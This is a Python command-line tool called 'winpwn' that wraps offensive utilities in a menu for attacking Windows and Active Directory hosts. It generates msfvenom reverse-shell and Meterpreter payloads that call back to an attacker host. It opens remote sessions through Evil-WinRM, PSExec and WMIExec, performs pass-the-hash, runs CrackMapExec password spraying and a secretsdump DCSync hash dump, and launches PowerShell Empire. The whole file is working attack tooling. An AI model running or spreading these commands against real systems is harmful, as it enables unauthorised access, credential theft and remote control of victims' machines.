#!/usr/bin/env python3
from sys import exit
from os import system
from time import sleep
from termcolor import colored
from colorama import Fore, Style
from subprocess import Popen,PIPE


def print_banner():
    print(Fore.WHITE + Style.BRIGHT + "")
    print(" __    __  ____  ____   ____  __    __  ____       ____  __ __ ")     
    print("|  |__|  ||    ||    \ |    \|  |__|  ||    \     |    \|  |  |")  
    print("|  |  |  | |  | |  _  ||  o  )  |  |  ||  _  |    |  o  )  |  |")    
    print("|  |  |  | |  | |  |  ||   _/|  |  |  ||  |  |    |   _/|  ~  |")    
    print("|  `  '  | |  | |  |  ||  |  |  `  '  ||  |  | __ |  |  |___, |")    
    print(" \      /  |  | |  |  ||  |   \      / |  |  ||  ||  |  |     |")    
    print("  \_/\_/  |____||__|__||__|    \_/\_/  |__|__||__||__|  |____/ ")    
    print("                                                               ")    
    print("                                      v1.1     @rootshooter\n\n")

def clear_screen():
    system("/usr/bin/clear")

def print_cyan(msg):
    print(colored(f"{msg}", "cyan", attrs=["bold"]))

def print_info(msg):
    print(colored(f"[*] {msg}", "cyan", attrs=["bold"]))

def print_warning(msg):
    print(colored(f"[!] {msg}", "yellow", attrs=["bold"]))

def print_success(msg):
    print(colored(f"[+] {msg}", "green", attrs=["bold"]))

def print_fail(msg):
    print(colored(f"[-] {msg}", "red", attrs=["bold"]))

menu_options = {
1: ' Generate Reverse Shell (msfvenom)',
2: ' Launch Metasploit Framework',
3: ' Launch Evil-WinRM Session',
4: ' Launch PSExec Session',
5: ' Launch WMIExec Session',
6: ' Launch SMBExec Session',
7: ' PassTheHash with PSExec',
8: ' PasswordSpray with CrackMapExec (SMB/WINRM)',
9: ' DCSync with SecretsDump',
10:  'Launch Starkiller GUI',
0: ' Exit',
}   

def main_menu():
    print_cyan("="*16+" Main Menu "+"="*16+"\n")
    for key in menu_options.keys():
        print_cyan(f"{key}. {menu_options[key]}")
    print_cyan("\n"+"="*43)

def msf_shell():
    try:
        print_warning("Please enter LHOST [tun0]")
        lhost = input("[winpwn]> ") or "tun0"
        print_warning("Please enter LPORT [53]", "yellow")
        lport = input("[winpwn]> ") or "53"
        print_warning("Please enter ARCH (x86/x64) [x86]")
        arch = input("[winpwn]> ") or "x86"
        print_warning("Please enter FILENAME [shell.exe]")
        filenm = input("[winpwn]> ") or "shell.exe"
        shell32 = f"/usr/bin/msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -f exe -o {filenm}"
        shell64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/shell/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -f exe -o {filenm}"
        print_success(f"Generating {filenm}\n")
        if arch == "x86":
            cmd = Popen([shell32], shell=True)
            cmd.wait()
            clear_screen()
        elif arch == "x64":
            cmd = Popen([shell64], shell=True)
            cmd.wait()
            clear_screen()
        else:
            print_fail("Invalid architecture! Please enter a valid option\n")
    except Exception as error:
        print_fail(f"{error}")
        
def msf_meterp():
    try:
        print_warning("Please enter LHOST [tun0]")
        lhost = input("[winpwn]> ") or "tun0"
        print_warning("Please enter LPORT [53]", "yellow")
        lport = input("[winpwn]> ") or "53"
        print_warning("Please enter ARCH (x86/x64) [x86]")
        arch = input("[winpwn]> ") or "x86"
        print_warning("Please enter FILENAME [meterpreter.exe]")
        filenm = input("[winpwn]> ") or "meterpreter.exe"
        meterp32 = f"/usr/bin/msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -f exe -o {filenm}"
        meterp64 = f"/usr/bin/msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -a {arch} -f exe -o {filenm}"
        print_success(f"Generating {filenm}\n")
        if arch == "x86":
            cmd = Popen([meterp32], shell=True)
            cmd.wait()
            clear_screen()
        elif arch == "x64":
            cmd = Popen([meterp64], shell=True)
            cmd.wait()
            clear_screen()
        else:
            print_fail("Invalid architecture! Please enter a valid option\n")
    except Exception as error:
        print_fail(f"{error}")
        
def shellgen():
    try:
        clear_screen()
        print_warning("\nDo you want Shell or Meterpreter? [s/m]")
        choice = input("[winpwn]> ")
        if choice == "s":
            msf_shell()
        elif choice == "m":
            msf_meterp()
        else:
            print_fail("Invalid option!\n")
    except Exception as error:
        print_fail(f"{error}")

def msflaunch():
    try:
        msflaunch = "/usr/bin/xfce4-terminal -T 'msfconsole' -x /usr/bin/msfconsole &" 
        cmd = Popen([msflaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")
        
def start_empire():
    try:
        empire = "/usr/bin/sudo /usr/bin/powershell-empire server"
        print_info("Starting PowerShell Empire Server!")
        cmd = Popen([empire], shell=True)
    except Exception as error:
        print_fail(f"{error}")

def run_starkiller():
    try:
        starkiller = "/usr/bin/starkiller"
        cmd = Popen([starkiller], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")
        
def starlaunch():
    try:
        start_empire()
        sleep(12)
        run_starkiller()
    except Exception as error:
        print_fail(f"{error}")

def winrmlaunch():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target password")
        passwd = input("[winpwn]> ")
        winrmlaunch = f"/usr/local/bin/evil-winrm -i {tgt_ip} -u {user} -p {passwd}"
        cmd = Popen([winrmlaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")

def psexeclaunch():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target domain name")
        domain = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target password")
        passwd = input("[winpwn]> ")
        psexeclaunch = f"/usr/local/bin/psexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([psexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")

def wexeclaunch():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target domain name")
        domain = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target password")
        passwd = input("[winpwn]> ")
        wexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([wexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")
        
def sexeclaunch():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target domain name")
        domain = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target password")
        passwd = input("[winpwn]> ")
        sexeclaunch = f"/usr/local/bin/wmiexec.py {domain}/{user}:'{passwd}'@{tgt_ip}"
        cmd = Popen([sexeclaunch], shell=True)
        cmd.wait()
        clear_screen()
    except Exception as error:
        print_fail(f"{error}")

def psexec_pth():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target domain name")
        domain = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target NTLM hash [:<ntlm hash value>]")
        hash = input("[winpwn]> ")
        psexec_pth = f"/usr/local/bin/psexec.py {domain}/{user}@{tgt_ip} -hashes '{hash}'"
        cmd = Popen([psexec_pth], shell=True)
        cmd.wait()
        clear_screen()
    except KeyboardInterrupt:
        print_fail("Exiting!")
        exit()     
    except Exception as error:
        print_fail(f"{error}")

def smb_cme():
    try:
        print_warning("Please enter target IP address or target subnet [10.10.10.0/24]")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target username or user file")
        user = input("[winpwn]> ")
        print_warning("Please enter target password or password file")
        passwd = input("[winpwn]> ")
        pass_cmd = f"/usr/bin/crackmapexec smb {tgt_ip} -u {user} -p {passwd}"
        cmd = Popen([pass_cmd], shell=True)
        cmd.wait()
        exit()
    except KeyboardInterrupt:
        print_fail("Exiting!")
        exit()
    except Exception as error:
        print_fail(f"{error}")
        exit()

def winrm_cme():
    try:
        print_warning("Please enter target IP address or target subnet [10.10.10.0/24]")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target username or user file")
        user = input("[winpwn]> ")
        print_warning("Please enter target password or password file")
        passwd = input("[winpwn]> ")   
        pass_cmd = f"/usr/bin/crackmapexec winrm {tgt_ip} -u {user} -p {passwd}"
        cmd = Popen([pass_cmd], shell=True)
        cmd.wait()
        exit()
    except KeyboardInterrupt:
        print_fail("Exiting!")
        exit()
    except Exception as error:
        print_fail(f"{error}")
        exit()

def cme_spray():
    try:
        clear_screen()
        print_warning("Do you want SMB or WINRM [s/w]")
        choice = input("[winpwn]> ")
        if choice == "s":
            smb_cme()
        elif choice == "w":
            winrm_cme()
        else:
            print_fail("Invalid option!\n")
    except KeyboardInterrupt:
        print_fail("Exiting!")
        exit()
    except Exception as error:
        print_fail(f"{error}")
        exit()

def secrets_dump():
    try:
        clear_screen()
        print_warning("Please enter target IP address")
        tgt_ip = input("[winpwn]> ")
        print_warning("Please enter target domain name")
        domain = input("[winpwn]> ")
        print_warning("Please enter target username")
        user = input("[winpwn]> ")
        print_warning("Please enter target password")
        passwd = input("[winpwn]> ")
        dcsync = f"/usr/local/bin/secretsdump.py {domain}/{user}:'{passwd}'@{tgt_ip} -just-dc-ntlm"
        print_success(f"Dumping {domain}/{tgt_ip} hashes!")
        cmd = Popen([dcsync], shell=True)
        cmd.wait()
    except KeyboardInterrupt:
        print_fail("Exiting!")
        exit()
    except Exception as error:
        print_fail(f"{error}")
        exit()
       
def prog_exit():
    clear_screen()
    exit()

def main():
    print_banner()
    while True:
        try:
            main_menu()
            choice = ""
            try:
                choice = int(input("\n[winpwn]> "))
            except KeyError:
                print_fail("Please choose a valid option!")
            except Exception as error:
                print_fail(f"{error}")
                exit()
            if choice == 1:
                shellgen()
            elif choice == 2:
                msflaunch()
            elif choice == 3:
                winrmlaunch()
            elif choice == 4:
                psexeclaunch()
            elif choice == 5:
                wexeclaunch()
            elif choice == 6:
                sexeclaunch()
            elif choice == 7:
                psexec_pth()
            elif choice == 8:
                cme_spray()
            elif choice == 9:
                secrets_dump()
            elif choice == 10:
                starlaunch()
            elif choice == 0:
                prog_exit()
            else:
                print_fail("Invalid option! Please make a valid selection.")
        except KeyboardInterrupt:
            print_fail("Exiting!")
            exit()
        except Exception as error:
            print_fail(f"{error}")
            exit()

if __name__ == "__main__":
    main()
